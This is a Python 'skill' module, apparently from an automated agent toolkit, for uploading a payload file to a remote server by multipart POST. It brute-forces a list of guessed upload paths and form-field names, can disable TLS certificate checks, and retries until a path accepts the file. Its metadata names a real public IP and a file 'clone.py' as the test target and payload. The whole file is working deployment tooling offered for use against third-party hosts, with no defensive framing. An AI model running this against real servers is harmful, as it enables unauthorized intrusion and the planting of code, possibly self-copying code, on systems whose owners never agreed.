"""skill/deploy_http_post_multipart.py - 使用HTTP POST多部分表单上传payload到远程路径

SKILL_META:
{
  "name": "deploy_http_post_multipart",
  "description": "使用HTTP POST多部分表单上传payload到远程路径",
  "category": "deploy",
  "test_target": "209.51.188.20:443 /pub",
  "test_args": "--host 209.51.188.20 --port 443 --path /pub --payload_file clone.py --ignore_ssl",
  "version": "15.0"
}
"""
from __future__ import annotations
import argparse, json, os, ssl, sys, http.client, mimetypes
from typing import Optional
from urllib.parse import urlparse

PATH_VARIANTS = ["", "/upload", "/uploads", "/files", "/data", "/api/upload", "/pub", "/pub/upload", "/pub/incoming", "/pub/files", "/incoming", "/upload/pub"]
DEFAULT_FIELDS = ["file", "upload_file", "file_upload", "Filedata", "attachment"]

def build_body(fields, boundary=None):
    boundary = boundary or "----FormBoundary" + os.urandom(16).hex()
    body = b""
    for name, (filename, content, ct) in fields.items():
        body += f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {ct}\r\n\r\n".encode() + content + b"\r\n"
    return body + f"--{boundary}--\r\n".encode(), boundary

def send_req(conn, method, path, body, headers, timeout=120, debug=False):
    redirect_history, current_path, current_conn = [], path, conn
    for _ in range(6):
        try:
            current_conn.request(method, current_path, body, headers)
            resp = current_conn.getresponse()
            status, resp_body = resp.status, resp.read().decode("utf-8", errors="replace")
            if status in (301, 302, 303, 307, 308):
                loc = resp.getheader("Location") or resp.getheader("location")
                if loc:
                    redirect_history.append(f"{status} -> {loc}")
                    parsed = urlparse(loc)
                    if parsed.netloc:
                        hp = parsed.netloc.split(":")
                        current_conn.close()
                        ctx = current_conn.context if hasattr(current_conn, 'context') else None
                        if ctx:
                            current_conn = http.client.HTTPSConnection(hp[0], int(hp[1]) if len(hp) > 1 else 443, timeout=timeout, context=ctx)
                        else:
                            current_conn = http.client.HTTPConnection(hp[0], int(hp[1]) if len(hp) > 1 else 443, timeout=timeout)
                        current_path = parsed.path or "/"
                        continue
                    current_path = parsed.path or "/"
                    if not current_path.startswith("/"): current_path = "/" + current_path
                    continue
            return status, resp_body, redirect_history, dict(resp.getheaders())
        except http.client.HTTPException as e:
            return 0, str(e), redirect_history, {}
    return 508, "Too many redirects", redirect_history, {}

def try_paths(host, port, base_path, filename, body, boundary, debug=False, timeout=120, ssl_ctx=None):
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "Content-Length": str(len(body))}
    paths = [base_path.rstrip("/") + "/" + (s.lstrip("/") + "/" + filename if s else filename) for s in PATH_VARIANTS]
    results = []
    for path in list(dict.fromkeys(paths)):
        try:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ssl_ctx) if ssl_ctx else http.client.HTTPConnection(host, port, timeout=timeout)
            code, body_r, rh, rhdr = send_req(conn, "POST", path, body, headers, timeout, debug)
            conn.close()
            results.append({"path": path, "response_code": code, "response_body": body_r, "redirect_history": rh, "response_headers": rhdr})
            if 200 <= code < 300:
                return {"success": True, "response_code": code, "message": body_r[:500] or "Upload success", "redirect_history": rh, "used_path": path, "all_attempts": results}
        except Exception as e:
            results.append({"path": path, "error": str(e)})
    return {"success": False, "response_code": results[-1].get("response_code", 0) if results else 0, "message": "All path variants failed", "redirect_history": [], "used_path": "", "all_attempts": results}

def create_dummy(name="dummy_payload.py"):
    path = os.path.join(os.getcwd(), name)
    with open(path, "w") as f: f.write("#!/usr/bin/env python3\nprint('Hello')\n")
    return path

def main(*args, **kwargs) -> dict:
    result = {"success": False, "response_code": 0, "message": "", "redirect_history": [], "error_detail": {}}
    parser = argparse.ArgumentParser(description="HTTP POST multipart upload")
    parser.add_argument("--host"), parser.add_argument("--port", type=int), parser.add_argument("--path")
    parser.add_argument("--payload_file"), parser.add_argument("--debug", action="store_true")
    parser.add_argument("--timeout", type=int, default=120), parser.add_argument("--file_field")
    parser.add_argument("--scheme", choices=["http","https"], default="http"), parser.add_argument("--ignore_ssl_verify", "--ignore_ssl", action="store_true")
    parser.add_argument("--retry", type=int, default=3)
    if args: sys.argv = ["prog"] + list(args)
    try: parsed = parser.parse_args()
    except SystemExit: parsed = None

    host = kwargs.get("host") or ""; port = kwargs.get("port"); path = kwargs.get("path") or ""
    payload_file = kwargs.get("payload_file") or ""; debug = kwargs.get("debug", False)
    timeout = kwargs.get("timeout", 120); file_field = kwargs.get("file_field") or ""
    scheme = kwargs.get("scheme", "http"); ignore_ssl = kwargs.get("ignore_ssl_verify", False) or kwargs.get("ignore_ssl", False)
    retry = kwargs.get("retry", 3)

    if parsed:
        host = host or parsed.host or ""; port = port or parsed.port
        path = path or parsed.path or ""; payload_file = payload_file or parsed.payload_file or ""
        debug = debug or parsed.debug; timeout = timeout or parsed.timeout or 120
        file_field = file_field or parsed.file_field or ""; scheme = scheme or parsed.scheme or "http"
        ignore_ssl = ignore_ssl or parsed.ignore_ssl_verify; retry = parsed.retry if parsed.retry is not None else retry

    if host.startswith("https://"): scheme = "https"; p = urlparse(host); host = p.netloc or p.hostname or ""; port = port or p.port; path = path or p.path
    elif host.startswith("http://"): scheme = "http"; p = urlparse(host); host = p.netloc or p.hostname or ""; port = port or p.port; path = path or p.path

    if not host or not path:
        result["message"] = "Missing required arguments: host, path"
        return result

    ssl_ctx = None
    if scheme == "https" or port == 443:
        try:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            if ignore_ssl: ssl_ctx.check_hostname = False; ssl_ctx.verify_mode = ssl.CERT_NONE
            else: ssl_ctx.check_hostname = True; ssl_ctx.verify_mode = ssl.CERT_REQUIRED
        except Exception as e: result["message"] = f"SSL error: {e}"; return result
    port = port or (443 if scheme == "https" else 80)

    filename = os.path.basename(payload_file) if payload_file else "dummy_payload.py"
    if not payload_file or not os.path.exists(payload_file):
        try: payload_file = create_dummy(filename); result["info"] = f"Created dummy: {payload_file}"
        except Exception as e: result["message"] = f"Failed to create dummy: {e}"; return result

    try:
        with open(payload_file, "rb") as f: content = f.read()
        ct = mimetypes.guess_type(payload_file)[0] or "application/octet-stream"
        fields_to_try = [file_field] if file_field else DEFAULT_FIELDS
        for field in fields_to_try:
            for attempt in range(retry):
                body, boundary = build_body({field: (filename, content, ct)})
                res = try_paths(host, port, path, filename, body, boundary, debug, timeout, ssl_ctx)
                if res["success"]:
                    res["file_field_used"] = field; res["scheme_used"] = scheme; res["ignore_ssl_verify"] = ignore_ssl; res["retry_count"] = attempt
                    return res
            last_result = res
        if last_result:
            atts = last_result.get("all_attempts", [])
            last_result["error_detail"] = {"attempts_count": len(atts), "tried_fields": fields_to_try, "scheme": scheme, "retry": retry}
            return last_result
    except FileNotFoundError as e: result["message"] = f"File error: {e}"
    except (ConnectionRefusedError, TimeoutError, OSError) as e: result["message"] = f"Network error: {e}"
    except Exception as e: result["message"] = f"Unexpected error: {e}"
    return result

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, ensure_ascii=False, indent=2))